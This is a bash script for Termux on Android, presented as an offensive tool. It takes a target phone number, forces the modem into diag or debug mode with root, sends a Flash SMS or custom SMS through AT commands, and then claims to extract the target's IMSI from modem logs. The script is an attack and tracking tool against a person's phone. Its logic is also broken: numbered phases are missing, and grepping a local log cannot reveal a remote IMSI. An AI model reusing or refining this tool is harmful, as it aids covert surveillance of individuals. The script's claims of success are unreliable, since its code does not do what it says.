#!/bin/bash

# Define colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Print tool title
echo -e "${RED}
  _ _    _ _ 
 |_   _|  __ \\ \\/ /|_   _|_   _|
   | | | |__) \\  /   | |   | |  
   | | |  _  / /\\ \\  | |   | |  
  _| |_| | \\ \\/  \\ \\_| |_ _| |_ 
 |_|_|  \\_/\\_/\\_/|___|_| 
 --devlpped by https://github.com/TX-One--
${NC}"

# Check if running on Termux
if ! command -v termux-setup-storage &> /dev/null; then
    echo -e "${RED}[!] Please run this tool on Termux for Android.${NC}"
    exit 1
fi

# Request user inputs
read -p "Enter the target phone number: " TARGET_NUMBER
read -p "Enter the custom message (if Flash SMS fails): " CUSTOM_MESSAGE

# Phase 1: Check for internal modem access
echo -e "${YELLOW}[*] Checking for internal modem access...${NC}"
MODEM_PORT=$(ls /dev/ | grep -E 'ttyUSB|ttyACM|radio')

if [ -z "$MODEM_PORT" ]; then
    echo -e "${YELLOW}[!] No internal modem found. Attempting to enable via Debug Mode...${NC}"
    setprop persist.radio.usb.enable 1
    MODEM_PORT=$(ls /dev/ | grep -E 'ttyUSB|ttyACM|radio')
    
    if [ -z "$MODEM_PORT" ]; then
        echo -e "${YELLOW}[!] Attempting to enable Diag Mode...${NC}"
        su -c 'setprop sys.usb.config diag,adb'
        MODEM_PORT=$(ls /dev/ | grep -E 'ttyUSB|ttyACM|radio')
        
        if [ -z "$MODEM_PORT" ]; then
            echo -e "${RED}[!] Failed to enable internal modem. Switching to external modem...${NC}"
            MODEM_PORT=$(lsusb | grep -E 'Modem|Huawei|ZTE')
            if [ -z "$MODEM_PORT" ]; then
                echo -e "${RED}[!] No external modem detected. Operation failed.${NC}"
                exit 1
            else
                echo -e "${GREEN}[+] External modem detected.${NC}"
                MODEM_PORT=$(ls /dev/ | grep -E 'ttyUSB|ttyACM')
            fi
        fi
    fi
fi

echo -e "${GREEN}[+] Modem found at: /dev/$MODEM_PORT${NC}"

# Phase 4: Send Flash SMS
echo -e "${YELLOW}[*] Attempting to send Flash SMS...${NC}"
echo -e "AT+CMGF=1\r" > /dev/$MODEM_PORT
sleep 1
echo -e "AT+CSMP=17,167,0,240\r" > /dev/$MODEM_PORT
sleep 1
echo -e "AT+CMGS=\"$TARGET_NUMBER\"\r" > /dev/$MODEM_PORT
sleep 1
echo -e "Test Flash SMS\x1A" > /dev/$MODEM_PORT
sleep 2

# Check if Flash SMS was sent successfully
RESPONSE=$(cat /dev/$MODEM_PORT)
if [[ $RESPONSE == *"OK"* ]]; then
    echo -e "${GREEN}[+] Flash SMS sent successfully.${NC}"
else
    echo -e "${YELLOW}[!] Flash SMS failed. Attempting to send a regular SMS...${NC}"
    echo -e "AT+CMGF=1\r" > /dev/$MODEM_PORT
    sleep 1
    echo -e "AT+CMGS=\"$TARGET_NUMBER\"\r" > /dev/$MODEM_PORT
    sleep 1
    echo -e "$CUSTOM_MESSAGE\x1A" > /dev/$MODEM_PORT
    sleep 2
    
    RESPONSE=$(cat /dev/$MODEM_PORT)
    if [[ $RESPONSE == *"OK"* ]]; then
        echo -e "${GREEN}[+] Regular SMS sent successfully.${NC}"
    else
        echo -e "${RED}[!] Failed to send SMS. Operation failed.${NC}"
        exit 1
    fi
fi

# Phase 5: Monitor cellular activity
echo -e "${YELLOW}[*] Starting cellular activity monitoring...${NC}"
echo -e "AT+CREG=2\r" > /dev/$MODEM_PORT
sleep 1
echo -e "AT+QENG=1\r" > /dev/$MODEM_PORT
sleep 1

# Phase 6: Analyze logs to extract IMSI
echo -e "${YELLOW}[*] Analyzing logs to extract IMSI...${NC}"
LOGFILE="modem_log.txt"
cat /dev/$MODEM_PORT > $LOGFILE &
sleep 10
killall cat

IMSI=$(grep -E "IMSI|+CMT" $LOGFILE)
if [[ $IMSI ]]; then
    echo -e "${GREEN}[+] IMSI found: $IMSI${NC}"
else
    echo -e "${RED}[!] No IMSI found in logs. Operation failed.${NC}"
    exit 1
fi

# Phase 7: Error handling
echo -e "${YELLOW}[*] Checking for potential errors...${NC}"
if [[ $IMSI == *"ERROR"* ]]; then
    echo -e "${RED}[!] An error occurred while extracting IMSI.${NC}"
    exit 1
else
    echo -e "${GREEN}[+] Operation completed successfully.${NC}"
fi

# End of script
echo -e "${GREEN}[+] Process finished successfully.${NC}"
